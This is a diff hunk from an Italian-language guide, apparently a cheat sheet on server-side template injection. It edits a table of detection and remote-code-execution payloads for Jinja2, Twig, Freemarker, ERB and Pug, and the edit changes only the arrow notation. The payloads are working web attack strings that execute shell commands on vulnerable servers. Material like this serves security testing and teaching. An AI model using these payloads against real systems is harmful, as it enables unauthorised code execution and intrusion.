@@ -187,11 +187,11 @@ L'exploit SSTI in Jinja2 sfrutta l'MRO di Python per risalire dalla sandbox del 
 
 | Engine | Linguaggio | Payload Detection | Payload RCE |
 | :--- | :--- | :--- | :--- |
-| Jinja2 | Python | `{{7*7}}` -> 49 | `{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}` |
-| Twig | PHP | `{{7*7}}` -> 49 | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` |
-| Freemarker | Java | `${7*7}` -> 49 | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
-| ERB | Ruby | `<%= 7*7 %>` -> 49 | `<%= system("id") %>` |
-| Pug | Node.js | `#{7*7}` -> 49 | `#{root.process.mainModule.require('child_process').execSync('id')}` |
+| Jinja2 | Python | `{{7*7}}` = 49 | `{{self.__init__.__globals__.__builtins__.__import__('os').popen('id').read()}}` |
+| Twig | PHP | `{{7*7}}` = 49 | `{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}` |
+| Freemarker | Java | `${7*7}` = 49 | `<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}` |
+| ERB | Ruby | `<%= 7*7 %>` = 49 | `<%= system("id") %>` |
+| Pug | Node.js | `#{7*7}` = 49 | `#{root.process.mainModule.require('child_process').execSync('id')}` |
 
 ---
 
